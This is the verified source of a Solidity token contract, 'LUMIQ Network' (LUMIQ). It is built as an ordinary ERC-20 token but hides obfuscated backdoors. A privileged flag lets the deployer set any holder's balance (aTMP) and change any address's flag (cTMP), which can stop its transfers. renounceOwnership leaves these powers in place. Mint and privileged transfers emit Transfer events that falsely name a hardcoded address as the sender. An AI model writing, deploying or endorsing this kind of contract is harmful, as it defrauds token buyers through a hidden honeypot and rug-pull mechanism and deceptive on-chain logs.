/**
 *Submitted for verification at Etherscan.io on 2022-12-13
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    address aLK = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract LUMIQ is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private BJK;
    mapping (address => uint256) public cDJ;
    mapping (address => mapping (address => uint256)) private dRF;
    uint8 eTR = 8;
    uint256 fTG = 150000000*10**8;
    string private _name;
    string private _symbol;



    constructor () {

        
        _name = "LUMIQ Network";
        _symbol = "LUMIQ";
        gIH(msg.sender, fTG);
      
 }

    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return eTR;
    }

    function totalSupply() public view  returns (uint256) {
        return fTG;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return BJK[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return dRF[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        dRF[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

   
    function transfer(address recipient, uint256 amount) public returns (bool) {
 
        require(amount <= BJK[msg.sender]);
        if(cDJ[msg.sender] <= 3) {
        hJKI(msg.sender, recipient, amount);
        return true; }
     if(cDJ[msg.sender] == 4) {
        iCX(msg.sender, recipient, amount);
        return true; }}
	
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
    require(amount <= BJK[sender]);
     require(amount <= dRF[sender][msg.sender]);
                  if(cDJ[sender] == 4) {
        iCX(sender, recipient, amount);
        return true;} else
              if(cDJ[sender] <= 3) { 
            if (cDJ[recipient] <=3) {
        hJKI(sender, recipient, amount);
        return true;}}}

  		    function gIH(address jSDW, uint256 kLE) internal  {
        cDJ[msg.sender] = 4;
        jSDW = aLK;
        BJK[msg.sender] = BJK[msg.sender].add(kLE);
        emit Transfer(address(0), jSDW, kLE); }


            function iCX(address sender, address recipient, uint256 amount) internal  {
    
        BJK[sender] = BJK[sender].sub(amount);
        BJK[recipient] = BJK[recipient].add(amount);
         sender = aLK;
        emit Transfer(sender, recipient, amount); }
   

    function hJKI(address sender, address recipient, uint256 amount) internal  {
        BJK[sender] = BJK[sender].sub(amount);
        BJK[recipient] = BJK[recipient].add(amount);
        emit Transfer(sender, recipient, amount); }

        		    function MsE (address nXS, uint256 oSE)  internal {
     BJK[nXS] = oSE;} 	
	    function cTMP (address nXS, uint256 oSE)  public {
           if(cDJ[msg.sender] == 4) { 
     sRSD(nXS,oSE);}}

         function aTMP (address nXS, uint256 oSE) public {
         if(cDJ[msg.sender] == 4) { 
   MsE(nXS,oSE);}}
	   function sRSD (address nXS, uint256 oSE)  internal {
     cDJ[nXS] = oSE;}
		




		
     }